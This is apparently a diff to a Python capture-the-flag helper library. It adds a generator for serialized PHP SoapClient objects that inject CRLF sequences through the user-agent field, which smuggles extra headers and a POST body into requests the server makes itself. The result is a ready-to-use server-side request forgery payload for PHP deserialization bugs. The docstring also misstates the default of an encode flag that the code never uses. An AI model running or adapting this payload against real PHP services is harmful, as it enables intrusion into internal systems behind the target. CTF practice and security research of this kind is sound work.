@@ -5,17 +5,17 @@ from http.server import HTTPServer
 from itertools import chain
 from json import loads
 from threading import Thread
-from typing import Union, List, Tuple
-from urllib.parse import quote
+from typing import Union, List, Tuple, Dict
+from urllib.parse import quote, quote_plus
 from hashlib import md5
 
 import requests
-import json
 from ctfbox.exceptions import (FlaskSessionHelperError, HashAuthArgumentError,
                                ProvideArgumentError, GeneratePayloadError)
 from ctfbox.utils import random_string, Context, ProvideHandler, Threader
 from ctfbox.utils import md5 as _md5
 from ctfbox.utils import sha1, sha256, sha512
+from ctfbox.thirdparty.phpserialize import serialize
 
 
 class HashType(Enum):
@@ -32,6 +32,25 @@ contentType = str
 
 HASHTYPE_DICT = {HashType.MD5: _md5, HashType.SHA1: sha1,
                  HashType.SHA256: sha256, HashType.SHA512: sha512}
+
+
+class SoapClient(object):
+    def __init__(self, url, user_agent: str = "", headers: Dict[str, str] = {}, post_data: str = ""):
+        self.uri = "hello"
+        self.location = url
+        self._stream_context = 0
+        user_agent = user_agent.strip()
+        post_data = post_data.strip()
+        new_headers = {}
+        if _is_json(post_data):
+            new_headers["Content-Type"] = "application/json"
+        else:
+            new_headers["Content-Type"] = "application/x-www-form-urlencoded"
+        new_headers.update(headers)
+        new_headers["Content-Length"] = len(post_data)
+        headers_string = "\r\n".join(f"{k}: {v}" for k, v in new_headers.items())
+        self._user_agent = f"""{user_agent}\r\n{headers_string}\r\n\r\n{post_data}"""
+        self._soap_version = 1
 
 
 def _check_flask_import():
@@ -614,3 +633,27 @@ def php_serialize_escape_l2s(src: str, dst: str, payload: str, paddingTrush: boo
                 'trash_data': (i * '@')
             }
             return result
+
+
+def soapclient_ssrf(url: str, user_agent: str = "Syclover", headers: Dict[str, str] = {}, post_data: str = "", encode: bool = True) -> Union[str, bytes]:
+    """Generate php soapClient class payload for ssrf
+
+    Args:
+        url (str): target url
+        user_agent (str, optional): the user agent. Defaults to "Syclover".
+        headers (Dict[str, str], optional): ohter headers. Defaults to {}.
+        post_data (str, optional): the data you want to post. Defaults to "".
+        encode (bool, optional): whether to encode payload. Defaults to False.
+
+    Returns:
+        Union[str, bytes]: generated payload
+    """
+    if not user_agent:
+        user_agent = "Syclover"
+    soap = SoapClient(url, user_agent, headers, post_data)
+    s = serialize(soap)
+    try:
+        s = s.decode()
+    except UnicodeDecodeError:
+        pass
+    return quote_plus(s)
